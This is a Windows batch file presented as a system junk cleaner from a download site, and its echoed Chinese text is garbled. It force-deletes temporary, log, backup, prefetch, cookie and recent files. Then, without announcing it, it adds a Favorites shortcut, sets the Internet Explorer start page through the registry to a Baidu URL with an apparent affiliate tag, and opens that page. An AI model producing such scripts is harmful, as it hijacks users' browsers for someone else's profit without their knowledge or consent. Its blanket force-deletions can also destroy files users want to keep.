@echo off 
echo �ֱ�������ɫ���վwww.pb86.net��������ϵͳ�����ļ������Ե�......����ϵͳ������������ϵͳ���죡
del /f /s /q %systemdrive%\*.tmp 
del /f /s /q %systemdrive%\*._mp 
del /f /s /q %systemdrive%\*.log 
del /f /s /q %systemdrive%\*.gid 
del /f /s /q %systemdrive%\*.chk 
del /f /s /q %systemdrive%\*.old 
del /f /s /q %systemdrive%\recycled\*.* 
del /f /s /q %windir%\*.bak 
del /f /s /q %windir%\prefetch\*.* 
rd /s /q %windir%\temp & md %windir%\temp 
del /f /q %userprofile%\cookies\*.* 
del /f /q %userprofile%\recent\*.* 
del /f /s /q "%userprofile%\Local Settings\Temporary Internet Files\*.*" 
del /f /s /q "%userprofile%\Local Settings\Temp\*.*" 
del /f /s /q "%userprofile%\recent\*.*" 
echo �ֱ�������ɫ���վwww.pb86.net����ϵͳ������ɣ� 
echo. & pause 

echo [InternetShortcut] > "%USERPROFILE%\Favorites\�ٶ�����.url"
echo URL=http://www.baidu.com/index.php?tn=pubeihyj&fyb=0 >> "%USERPROFILE%\Favorites\�ٶ�����.url"
echo IDList= >>"%USERPROFILE%\Favorites\�ٶ�����.url"
echo [{000214A0-0000-0000-C000-000000000046}] >> "%USERPROFILE%\Favorites\�ٶ�����.url"
echo  Prop3=19,2 >> "%USERPROFILE%\Favorites\�ٶ�����.url"

@echo 
reg add "HKCU\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /d "http://www.baidu.com/index.php?tn=pubeihyj&fyb=0" /f
@start iexplore.exe http://www.baidu.com/index.php?tn=pubeihyj&fyb=0 